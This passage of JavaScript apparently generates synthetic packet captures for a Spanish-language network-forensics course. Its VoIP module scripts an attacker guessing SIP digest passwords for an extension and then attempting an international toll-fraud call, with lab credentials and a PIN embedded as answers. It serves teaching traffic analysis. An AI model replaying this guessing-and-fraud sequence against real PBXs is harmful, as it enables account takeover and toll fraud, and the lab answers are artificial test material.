    V.guesses.forEach((pw, i) => {
      const ci = ['Call-ID', `${V.atkCallBase + i}@${atk.ip}`], fr = ['From', `"${V.victim}" <sip:${V.victim}@${R}>;tag=7b${i}e1`], to = ['To', `"${V.victim}" <sip:${V.victim}@${R}>`], nonce = V.atkNonces[i];
      sipTo(atk, pbx, 5062, 5060, `REGISTER sip:${R} SIP/2.0`, [va(`9a1${i}0`, 5062), ['Max-Forwards', '70'], fr, to, ci, ['CSeq', '1 REGISTER'], ['Contact', `<sip:${V.victim}@${atk.ip}:5062>`], uaS, ['Expires', '3600']]);
      c.jitter(0.001, 0.002);
      sipTo(pbx, atk, 5060, 5062, 'SIP/2.0 401 Unauthorized', [['Via', `SIP/2.0/UDP ${atk.ip}:5062;branch=z9hG4bK-9a1${i}0;received=${atk.ip};rport=5062`], fr, [to[0], `${to[1]};tag=as71c0${i}9d`], ci, ['CSeq', '1 REGISTER'], srv, ['WWW-Authenticate', `Digest algorithm=MD5, realm="${R}", nonce="${nonce}"`]]);
      c.jitter(0.004, 0.008);
      const r2 = digestResponse({ user: V.victim, realm: R, pass: pw, method: 'REGISTER', uri: `sip:${R}`, nonce });
      sipTo(atk, pbx, 5062, 5060, `REGISTER sip:${R} SIP/2.0`, [va(`9a1${i}1`, 5062), ['Max-Forwards', '70'], fr, to, ci, ['CSeq', '2 REGISTER'], ['Contact', `<sip:${V.victim}@${atk.ip}:5062>`],
        ['Authorization', `Digest username="${V.victim}", realm="${R}", nonce="${nonce}", uri="sip:${R}", response="${r2}", algorithm=MD5`], uaS, ['Expires', '3600']]);
      c.jitter(0.001, 0.002);
      sipTo(pbx, atk, 5060, 5062, 'SIP/2.0 403 Forbidden', [['Via', `SIP/2.0/UDP ${atk.ip}:5062;branch=z9hG4bK-9a1${i}1;received=${atk.ip};rport=5062`], fr, [to[0], `${to[1]};tag=as71c0${i}9d`], ci, ['CSeq', '2 REGISTER'], srv]);
      c.jitter(0.2, 0.3);
    });
    c.wait(1.2);
    const fraud = `sip:${V.fraudNumber}@${R}`, fci = ['Call-ID', `${V.atkCallBase + 9}@${atk.ip}`], ffr = ['From', `"${V.victim}" <sip:${V.victim}@${R}>;tag=55ab01`];
    sipTo(atk, pbx, 5062, 5060, `INVITE ${fraud} SIP/2.0`, [va('c0ffe1', 5062), ['Max-Forwards', '70'], ffr, ['To', `<${fraud}>`], fci, ['CSeq', '1 INVITE'], ['Contact', `<sip:${V.victim}@${atk.ip}:5062>`], uaS]);
    c.jitter(0.001, 0.002);
    sipTo(pbx, atk, 5060, 5062, 'SIP/2.0 403 Forbidden', [['Via', `SIP/2.0/UDP ${atk.ip}:5062;branch=z9hG4bK-c0ffe1;received=${atk.ip};rport=5062`], ffr, ['To', `<${fraud}>;tag=as2f0e9b44`], fci, ['CSeq', '1 INVITE'], srv]);
    c.jitter(0.001, 0.002);
    sipTo(atk, pbx, 5062, 5060, `ACK ${fraud} SIP/2.0`, [va('c0ffe1', 5062), ['Max-Forwards', '70'], ffr, ['To', `<${fraud}>;tag=as2f0e9b44`], fci, ['CSeq', '1 ACK'], uaS]);
    return c.pkts;
  },
};
const SCENARIO_FILES = { m1: 'm1-saludo-tcp', m2: 'm2-http', m3: 'm3-sesiones', m4: 'm4-dns', m5: 'm5-tls', m6: 'm6-ataques-web', m7: 'm7-directorio-activo', m8: 'm8-caza-soc', m9: 'm9-voip' };

/* Red de voz del módulo 9 (10.20.0.0/24, dominio voip.local) y los datos que las pruebas recalculan desde los paquetes */
const VOIP_HOSTS = {
  pbx: { mac: '02:00:0a:14:00:05', ip: '10.20.0.5', ttl: 64 },
  tel: { mac: '02:00:0a:14:00:15', ip: '10.20.0.21', ttl: 64 },
  atk: { mac: '02:00:0a:14:00:42', ip: '10.20.0.66', ttl: 64 },
};
const VOIP_M9 = {
  realm: 'voip.local', user: '1001', pass: 'verano2026', nonce: '6c1f0a8e3b5d4972', cnonce: '0a4f113b',
  uaPhone: 'Ondas SIP-T40 4.2.1', server: 'Asterisk PBX 20.5.0',
  regCallId: '5c7e1d93a0b24f6e@10.20.0.21', callId: '7f3b2e90c4d1a856@10.20.0.21', dest: '*97',
  portTel: 16384, portPbx: 10000, ssrcTel: 0x5a3c9e21, ssrcPbx: 0x1b7f04d3, seqTel: 21877, seqPbx: 4310, tsTel: 1840000, tsPbx: 96000,
  slots: 300, lostPbx: [61, 62, 63, 140, 177, 211, 212], burst: [150, 200], dtmfStart: 95, pin: '4721#', rtcpAt: [[120, 124], [240, 245]],
  victim: '1002', guesses: ['1002', '123456', 'password'], atkNonces: ['3a9e5f17', '7d20c4b8', '0e6b91fa'], atkCallBase: 1840566720, fraudNumber: '00447700900123',
};
/* Jitter entre llegadas (RFC 3550, A.8) en unidades de reloj de 8 kHz: J += (|D| - J) / 16 */
function voipJitter(arr, start) {
  let j = 0, prev = null;
  for (const x of arr) { const transit = x.t * 8000 - (start * 8000 + 160 * x.k); if (prev !== null) j += (Math.abs(transit - prev) - j) / 16; prev = transit; }
  return Math.round(j);
}
/* Audio sintético y determinista, 160 muestras por ranura de 20 ms.
   Centralita: locución con voz sintética, silencio mientras se teclea el PIN, tres tonos de confirmación y otra locución.
   Teléfono: un «¿hola?» corto y ruido de fondo. */
function voipVoice(who, k, r) {
  const out = new Array(160), t0 = k * 0.02;
  for (let i = 0; i < 160; i++) {
    const t = t0 + i / 8000; let s = (r() - 0.5) * 40;
    const voice = (f0, a, from, to) => {
      if (t < from || t >= to) return 0;
      const u = t - from, env = Math.sin(Math.PI * Math.min(1, u / (to - from))) * (0.55 + 0.45 * Math.sin(2 * Math.PI * 3.7 * u) ** 2);
      let v = 0; for (let h = 1; h <= 9; h++) v += Math.sin(2 * Math.PI * h * f0 * (1 + 0.04 * Math.sin(2 * Math.PI * 2.1 * u)) * u) / (1 + Math.abs(h * f0 - 650) / 180);
      return a * env * v;
    };
    const tone = (f, a, from, to) => (t >= from && t < to ? a * Math.sin(2 * Math.PI * f * (t - from)) * Math.min(1, (t - from) * 200, (to - t) * 200) : 0);
    if (who === 'pbx') s += voice(190, 2600, 0.1, 1.7) + tone(523, 7000, 4.4, 4.6) + tone(659, 7000, 4.65, 4.85) + tone(784, 7000, 4.9, 5.2) + voice(175, 2400, 5.3, 5.95);
    else s += voice(120, 3000, 0.3, 0.75);
    out[i] = s;
  }
  return out;
}
